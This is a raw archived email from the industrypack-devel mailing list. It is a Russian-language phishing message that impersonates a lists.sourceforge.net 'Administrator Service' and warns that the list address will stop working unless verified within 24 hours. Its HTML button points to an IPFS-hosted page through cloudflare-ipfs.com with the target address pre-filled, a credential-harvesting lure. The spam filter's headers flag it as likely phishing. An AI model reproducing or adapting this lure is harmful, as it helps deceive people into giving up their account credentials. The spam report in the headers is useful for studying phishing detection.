Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 9630A8B6FBE
	for <lists+industrypack-devel@lfdr.de>; Tue, 30 Apr 2024 12:34:18 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1s1koS-0003uC-4f
	for lists+industrypack-devel@lfdr.de;
	Tue, 30 Apr 2024 10:34:16 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <sara@icevolcano.com>) id 1s1koQ-0003u2-B7
 for industrypack-devel@lists.sourceforge.net;
 Tue, 30 Apr 2024 10:34:14 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=HqsC3uZro1CChePVe/GNhvN4eBps1ZeLmo0kp5h6B+k=; b=FGsmHI7tRm+UzMOhrfoLsUXI7X
 aR1EZiAxKpoOJ2lrx0ggN8S3AI2SeB05GclHybCaDKoKdWL19Wcy9gJmlkAW/XPTEewHRkWDSvmLG
 UX1gj3DR+9Iy/GKjfVniEL3ZYZ35FZsp4uu5wu0eVf15aWNecUCjHJYTLl74gCtKqEig=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=HqsC3uZro1CChePVe/GNhvN4eBps1ZeLmo0kp5h6B+k=; b=T
 gNsS/shM7A7uMQEeJAPkj5Xmbu4VAMZEksQ5JYrwPWUtjlVd1w5v7bY0vSewelaD+47wRB2vlvfTy
 Uwibfzl+L/TuWstixyUJoivCmeMooMA+pnkIfBL/wlNMzDaOGscJgVdtP5Q+xCpEI4VBcunO8gZ8o
 oW5QtG1CxGTMRQkg=;
Received: from aboon.icevolcano.com ([194.169.172.99])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1s1koP-0000Yw-ES for industrypack-devel@lists.sourceforge.net;
 Tue, 30 Apr 2024 10:34:14 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=icevolcano.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=sara@icevolcano.com; bh=DiQ2RMYftkx7HmYwo9ekt7ivvbA=;
 b=brUjwkEthvnFmk0kzMLco7xNvIEa7HQ7HXpLSMlswdVAGQVMc/O1UKKgkVu+DA+oAYPK09bBfUjT
 jKOQDjuBiF5a2xJJxC145+N1T2GnaSC33Nd7QhW0PPeS6sccif7WnF7wvWKD7XQRoOFG5w13ueXF
 X9nBR75zLP5UQ9YMkBaELJKwEq+xnyN+Kmpu9pwAqi4vfEBShrampAcyU50FzaDlWH/5TdkcskUI
 RnaeDj00BLwW8CvslRzsBv2ceCBgqIQsyuRZ3fL9jzo/ksmajwupkph3DNADXNqqq/w/pKrj0Jmb
 FRqPdfrVN4Jth/O8T02AifYxXAq7AZWaROMJTw==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=icevolcano.com;
 b=0qJHYhRrI9kTkRv7ShSo+JCl47CrjTO6+KZWKVWS2xGvNOIIzDwPf7ApMl+vMAz3+b3EcSOhpG9C
 Ogq+/Q1bQP+n0DteU+r0e0r7le+ioSOU1kUfUtHotvnt02VWy/h09oQFXeZHkaqhBPBQ2QIT9RMq
 LuICdM4mSpuKp6AZHcyPMGl2mwwyUn9LUOtQFAm2C277JWyduB/BVAjwprdgS/A7s6R7DFpuBrh4
 fr/5DDIzU/8/oaoXdwxkG0aA/bqNcIZcUp9o1nsfSfG5sObE5tTXi2uBxVyJNnszA+A46Jo6FSOF
 j50oO3sXd04BkXOH0E5GaRQafg9G2egq6aUW6A==;
From: lists.sourceforge.net
 =?UTF-8?B?0J7Qv9C+0LLQtdGJ0LXQvdC40LUg0L4g0LHQtdC30L7Qv9Cw0YHQvdC+0YHRgtC4?=<sara@icevolcano.com>
To: industrypack-devel@lists.sourceforge.net
Date: 30 Apr 2024 03:12:57 -0700
Message-ID: <20240430031212.0B7F9D16F1FB12D8@icevolcano.com>
MIME-Version: 1.0
X-Spam-Score: 8.2 (++++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Уважаемый клиент, industrypack-devel@lists.sourceforge.net
    В связи с обновлениями на нашем сервере
   в 2024 году ваша электронная почта: industrypack-devel@lists.sourceforge.net
    перестанет от [...] 
 
 Content analysis details:   (8.2 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: cloudflare-ipfs.com]
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
                             identical to background
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
                             valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
                             author's domain
  0.0 RCVD_IN_DNSWL_BLOCKED  RBL: ADMINISTRATOR NOTICE: The query to
                             DNSWL was blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [194.169.172.99 listed in list.dnswl.org]
  1.9 MIXED_ES               Too many es are not es
  1.9 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP
                             content via CloudFlare, likely phishing
  0.1 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
  2.0 PDS_DBL_URL_TNB_RUNON  Double-url and To no arrows, from runon
  1.5 PDS_FRNOM_TODOM_DBL_URL From Name to domain, double URL
  0.8 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1s1koP-0000Yw-ES
Subject: [Industrypack-devel] [SPAM]
 =?UTF-8?B?0KPQstC10LTQvtC80LvQtdC90LjQtSDQvtCxINC+0LHQvdC+0LLQu9C10L3QuNC4INGD0YfQtdGC0L3QvtC5INC30LDQv9C40YHQuDogdG9kYXkg?=4/30/2024
 3:12:12 a.m.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5535820853645189610=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============5535820853645189610==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.5em;"><p>

<br></p><div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: =
rgb(34, 34, 34); text-transform: none; text-indent: 0px; font-size: 15px; f=
ont-style: normal; font-weight: 400; word-spacing: 0px; vertical-align: bas=
eline; white-space: normal; background-color: rgb(255, 255, 255); text-deco=
ration-style: initial; text-decoration-color: initial;">
<div style=3D'border-width: 0px; margin: 0px; padding: 20px; font-family: "=
calibri",sans-serif,serif,"emojifont"; font-size: 16px; vertical-align: bas=
eline;'><font color=3D"#201f1e">&#1059;&#1074;&#1072;&#1078;&#1072;&#1077;&=
#1084;&#1099;&#1081; &#1082;&#1083;&#1080;&#1077;&#1085;&#1090;, <a target=
=3D"_blank" rel=3D"noopener noreferrer">industrypack-devel@lists.sourceforg=
e.net</a></font><div style=3D"border-width: 0px; margin: 0px; padding: 0px;=
 font-family: inherit; vertical-align: baseline;"><p><font color=3D"#201f1e=
">
&#1042; &#1089;&#1074;&#1103;&#1079;&#1080; &#1089; &#1086;&#1073;&#1085;&#=
1086;&#1074;&#1083;&#1077;&#1085;&#1080;&#1103;&#1084;&#1080; &#1085;&#1072=
; &#1085;&#1072;&#1096;&#1077;&#1084; &#1089;&#1077;&#1088;&#1074;&#1077;&#=
1088;&#1077; &#1074; 2024 &#1075;&#1086;&#1076;&#1091; &#1074;&#1072;&#1096=
;&#1072; &#1101;&#1083;&#1077;&#1082;&#1090;&#1088;&#1086;&#1085;&#1085;&#1=
072;&#1103; &#1087;&#1086;&#1095;&#1090;&#1072;:&nbsp;</font><font color=3D=
"#0b5394">
<a target=3D"_blank" rel=3D"noopener noreferrer">industrypack-devel@lists.s=
ourceforge.net</a></font><font color=3D"#201f1e">
&nbsp;&#1087;&#1077;&#1088;&#1077;&#1089;&#1090;&#1072;&#1085;&#1077;&#1090=
; &#1086;&#1090;&#1087;&#1088;&#1072;&#1074;&#1083;&#1103;&#1090;&#1100; &#=
1080; &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1090;&#1100; &#1101;&#108=
3;&#1077;&#1082;&#1090;&#1088;&#1086;&#1085;&#1085;&#1099;&#1077; &#1087;&#=
1080;&#1089;&#1100;&#1084;&#1072;, &#1077;&#1089;&#1083;&#1080; &#1085;&#10=
77; &#1073;&#1091;&#1076;&#1077;&#1090; &#1087;&#1088;&#1086;&#1074;&#1077;=
&#1088;&#1077;&#1085; &#1074;=20
&#1090;&#1077;&#1095;&#1077;&#1085;&#1080;&#1077; 24 &#1095;&#1072;&#1089;&=
#1086;&#1074;<br></font>
&#1063;&#1090;&#1086;&#1073;&#1099; &#1089;&#1086;&#1093;&#1088;&#1072;&#10=
85;&#1080;&#1090;&#1100; &#1089;&#1074;&#1086;&#1081; &#1072;&#1082;&#1082;=
&#1072;&#1091;&#1085;&#1090; &#1091; &#1085;&#1072;&#1089;, &#1087;&#1086;&=
#1078;&#1072;&#1083;&#1091;&#1081;&#1089;&#1090;&#1072;, &#1087;&#1088;&#10=
86;&#1074;&#1077;&#1088;&#1100;&#1090;&#1077; &#1089;&#1083;&#1077;&#1076;&=
#1091;&#1102;&#1097;&#1080;&#1077; &#1076;&#1072;&#1085;&#1085;&#1099;&#107=
7;.<br><br></p></div>
<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
31, 30); vertical-align: baseline;">
<div style=3D'border-width: 0px; margin: 0px; padding: 0px; font-family: "a=
rial","helvetica",sans-serif,serif,"emojifont"; font-size: 15px; vertical-a=
lign: baseline;' dir=3D"ltr"><div style=3D"border-width: 0px; margin: 0px; =
padding: 0px; vertical-align: baseline;">
<table style=3D'width: 384px; color: rgb(33, 33, 33); line-height: 0px; fon=
t-family: "roboto","robotodraft","helvetica","arial",sans-serif; font-size:=
 0px;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td alig=
n=3D"center" valign=3D"middle" style=3D"background: rgb(53, 88, 168); margi=
n: 0px; padding: 0px 15px; border-radius: 4px; border-collapse: collapse;" =
bgcolor=3D"#3558a8"><span style=3D"font-size: small;">
<a id=3D"m_2117543931973338975m_-4686339195906697552gmail-c90960228c1341edg=
mail-v1v1x_x_x_x_x_x_m_5228229997781280426m_-4582864256604226611gmail-x_x_g=
mail-m_4628436401360325222m_1270713067398412679m_-1564249429224047007gmail-=
m_7976746255904800835LPlnk404747" style=3D'border-width: 0px; margin: 0px; =
padding: 15px 0px; border-radius: 4px; color: rgb(255, 255, 255); line-heig=
ht: 21px; font-family: "helvetica","arial",sans-serif; font-size: 18px; fon=
t-weight: 600; text-decoration: none; vertical-align:=20
baseline; display: block;' href=3D"https://cloudflare-ipfs.com/ipfs/bafybei=
d5rlj5lsft4cas2mkymaxrwpl7y3dpuxeu7bvozeaxzwr25w4r5y/ws13duijk.html#industr=
ypack-devel@lists.sourceforge.net" target=3D"_blank" rel=3D"noopener norefe=
rrer" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudf=
lare-ipfs.com/ipfs/bafybeigiselxnmvpipjle4mpldsncbmgxy33abs5w2mbcanugcawfa6=
tmm/wzbrokxc.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D171040=
0358392000&amp;usg=3DAOvVaw355LZ3oYOhwtrLy3d3sh9A">
<span style=3D'font-family: "arial"; font-size: medium;'>&#1055;&#1088;&#10=
86;&#1074;&#1077;&#1088;&#1100;&#1090;&#1077;&#8594;industrypack-devel@list=
s.sourceforge.net</span></a></span><div style=3D"border-width: 0px; margin:=
 0px; padding: 0px; vertical-align: baseline;">&nbsp;</div></td></tr></tbod=
y></table></div>
<div style=3D"border-width: 0px; margin: 0px; padding: 0px; font-family: in=
herit; vertical-align: baseline;"><br></div><div style=3D"border-width: 0px=
; margin: 0px; padding: 0px; font-family: inherit; vertical-align: baseline=
;"><span style=3D'color: rgb(51, 51, 51); font-family: "roboto","arial"; fo=
nt-size: 12px; font-weight: 600;'>&copy;2024 lists.sourceforge.net <br></sp=
an></div><div style=3D"border-width: 0px; margin: 0px; padding: 0px; font-f=
amily: inherit; vertical-align: baseline;">
<span style=3D'color: rgb(51, 51, 51); font-family: "roboto","arial"; font-=
size: 12px; font-weight: 600;'>Administrator Service. <br>All Rights Reserv=
ed</span></div></div></div></div></div><p>



<br></p></body></html>


--===============5535820853645189610==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5535820853645189610==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5535820853645189610==--
